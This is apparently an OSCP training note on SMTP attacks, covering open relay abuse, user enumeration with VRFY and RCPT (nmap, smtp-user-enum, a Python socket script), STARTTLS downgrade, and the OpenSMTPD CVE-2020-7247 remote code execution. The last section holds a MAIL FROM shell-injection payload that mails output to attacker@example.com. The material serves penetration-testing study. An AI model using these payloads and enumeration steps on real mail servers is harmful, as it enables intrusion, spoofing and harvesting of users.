# Information Gathering — SMTP Enumeration & Exploitation

> **Track:** Mastering OSCP
> **Section:** Information Gathering — 003
> **Topics:** SMTP Protocol Basics, Encryption, User Enumeration, Open Relay Abuse, Encryption Downgrade, OpenSMTPD RCE

---

## 1. What is SMTP?

- **SMTP (Simple Mail Transfer Protocol)** is used for sending email messages between servers.
- Defined in **RFC 5321**.
- Operates at the **Application Layer** (Layer 7 of the OSI model).
- It's a **text-based** protocol — communication happens via plain-text commands, which makes it straightforward to interact with manually over a raw TCP connection.
- SMTP is commonly paired with **IMAP** or **POP3** on the receiving end, since SMTP itself only handles sending/relaying.

### How It Works

1. A client sends an email to an SMTP server.
2. The server checks the recipient's address and delivers the message.
3. Common ports:
   - **25** — relaying between mail servers
   - **587** — message submission (client to server)
   - **465** — encrypted submission (implicit TLS)

### Core SMTP Commands

| Command | Purpose |
|---|---|
| `HELO` / `EHLO` | Identifies the client to the server |
| `MAIL FROM` | Specifies the sender's address |
| `RCPT TO` | Specifies the recipient's address |
| `DATA` | Starts the body of the email |
| `QUIT` | Ends the SMTP session |

> Since SMTP is plain-text, tools like **Telnet** or **Netcat** can open a raw TCP connection to a mail server and issue these commands manually.

### Full Delivery Flow

1. Client connects to the SMTP server.
2. Authentication (SMTP AUTH) occurs if required — username + password.
3. Client sends: sender address, recipient address, message content.
4. Server inspects the message.
5. Server looks up the recipient's mail server via DNS (**MX record**).
6. Message is transferred to the destination mail server.
7. The **Mail Delivery Agent (MDA)** places the message into the recipient's mailbox.

---

## 2. Encryption & Authentication

By default:
- SMTP does **not** encrypt traffic.
- Data (including credentials, in some auth flows) travels as **plaintext**.

To mitigate this, servers typically use:
- **SSL/TLS**
- **STARTTLS**

...to protect passwords and message content in transit. Most modern servers also enforce **SMTP Authentication (SMTP AUTH)** to prevent unauthorized relaying.

---

## 3. SMTP Exploitation Scenarios (Overview)

| Scenario | Description |
|---|---|
| **Open Relay** | Server allows unauthenticated relaying of emails through it |
| **Lack of Encryption** | Enables interception of credentials/message content |
| **User Enumeration** | Identifying valid email addresses by analyzing server response codes |
| **Spoofing** | Forging the sender's address to impersonate someone |
| **RCE** | E.g., CVE-2020-7247 in OpenSMTPD |

---

## 4. Open Relay Attack

An "open relay" is an SMTP server configured to let **anyone** send email through it without authentication — effectively letting an attacker impersonate someone inside the organization.

**Steps:**

1. Find an open relay via a scan.
2. Connect (e.g., via Telnet) and manually send an email from an arbitrary address.

```bash
telnet <target-ip> 25
EHLO attacker.com
```

A `250` response confirms the server accepted the greeting, and you can proceed with the attack:

```
MAIL FROM:<victim@company.com>
RCPT TO:<your-test-email@example.com>
```

> Set `RCPT TO` to an email address you control during testing, so you can verify whether the relay actually delivers the message.

### Automating with Metasploit

```
msfconsole
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS 10.10.10.1
set MAILFROM attacker@evil.com
set MAILTO victim@test.com
set THREADS 5
```

---

## 5. SMTP User Enumeration

Many SMTP servers respond differently depending on whether a recipient address exists — this difference in behavior is what makes user enumeration possible.

```bash
telnet 10.10.10.1 25
EHLO attacker.com
```

```
250-mail.example.com Hello attacker.com
250-AUTH LOGIN PLAIN
250 DSN
```

When `RCPT TO` targets a **valid** email that exists on the server, you'll typically get `250 OK`. When it targets an address that **doesn't** exist, the server often responds with something like `User unknown` — which confirms which addresses are real.

### Alternative: `VRFY`

```bash
nc -nv 192.168.50.8 25
VRFY root
VRFY idontexist
```

### Automated Enumeration

**Using `smtp-user-enum`:**

```bash
smtp-user-enum -M VRFY -D example.com -U users.txt -t 10.0.0.1
```

> Download a relevant wordlist (e.g., from SecLists) rather than relying on generic username lists — SecLists has SMTP-specific wordlists worth checking.

**Using Nmap:**

```bash
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,RCPT} 10.10.10.1
```

Example output:
```
smtp-enum-users:
Valid user: admin@company.com
Valid user: support@company.com
Valid user: info@company.com
```

**Using Metasploit:**

```
use auxiliary/scanner/smtp/smtp_enum
```

### Custom Python Enumeration Script

```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <ip> <user>")
    sys.exit(0)

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
ip = sys.argv[1]
connect = s.connect((ip, 25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
user = (sys.argv[2]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

# Close the socket
s.close()
```

Usage:
```bash
python3 smtp.py 192.168.50.8 root
```

---

## 6. Encryption Downgrade Attacks

SMTP was originally designed as a plaintext protocol; encryption was bolted on later via **STARTTLS**. This means an attacker positioned to intercept traffic (MITM) can potentially strip the `STARTTLS` command, forcing the client to fall back to an unencrypted connection.

**Attack outline:**
1. Intercept the communication and strip the `STARTTLS` negotiation, forcing plaintext.
2. Capture sensitive information — credentials or message content — now traveling in the clear.

> This requires a MITM position on the network; the mechanics of setting that up are typically covered separately (e.g., ARP spoofing, rogue AP). This section covers only the SMTP-specific downgrade concept.

---

## 7. OpenSMTPD RCE — CVE-2020-7247

In 2020, a critical remote code execution vulnerability was discovered in OpenSMTPD, allowing an attacker to execute arbitrary system commands on the server.

**Exploitation via raw SMTP commands:**

```
HELO example.com
250 example.com Hello
MAIL FROM:<;exec /bin/sh -c 'echo Vulnerable | mail attacker@example.com';>
250 2.1.0 Ok
RCPT TO:<victim@example.com>
250 2.1.5 Ok
DATA
354 Enter mail, end with "." on a line by itself
250 2.0.0 Ok: queued
QUIT
```

> The `echo` command in the `MAIL FROM` payload can be swapped out for any command you want executed on the vulnerable server.

**Via Metasploit:**

```
use exploit/unix/smtp/opensmtpd_mail_from_rce
```
